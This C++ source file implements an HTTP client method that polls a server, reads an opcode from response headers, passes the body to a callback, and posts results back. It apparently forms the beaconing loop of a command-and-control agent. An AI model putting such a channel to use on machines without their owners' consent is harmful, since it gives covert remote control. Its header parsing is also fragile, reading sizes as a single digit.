#include "pch.h"
#include "HttpClient.h"

httplib::Error HttpClient::FetchFromServer() {
    try 
    {
        if (auto response = Client.Get(".")) 
        {        	
            std::string returnedData = "";
        	
            char resultOpcode = KeepAliveOpcode;            
        	
            if (response->status == 200)
            {            	
                const int ServerOC = static_cast<int>(*response->headers.find("Opcode")->second.c_str() - 48);                         
         	
            	if (ServerOC != KeepAliveOpcode) 
                {
                    resultOpcode = static_cast<char>(ClientOpcode::Failure);

                    const int returnDataMaxSize = static_cast<int>(*response->headers.find("Returned-Data-Size")->second.c_str() - 48);
 
                    if (this->CallbackFunction) 
                    {
	                    try 
                        {
                            this->CallbackFunction(static_cast<ServerOpcode>(ServerOC), (PVOID)response->body.c_str(), response->body.length(), &returnedData, returnDataMaxSize);
                            resultOpcode = static_cast<char>(ClientOpcode::Success);
	                    }
                        catch (const std::exception& exception) {
                            returnedData = exception.what();                            
                        }
	                    catch (...) {
                            returnedData = "[-] Unknown exception occurred";                            
	                    }                        
                    }
            	}                
            }      	
            httplib::Params postParameters{ { "Opcode", std::string(1, resultOpcode) }, {"Returned-Data", returnedData.c_str()} };
            auto post = Client.Post(".", postParameters);
            return httplib::Error::Success;
        }
    	else return response.error();        
    }
    catch (...) 
    {
    	// TODO: Handle each exception accordingly
        return httplib::Error::Unknown;
    }
}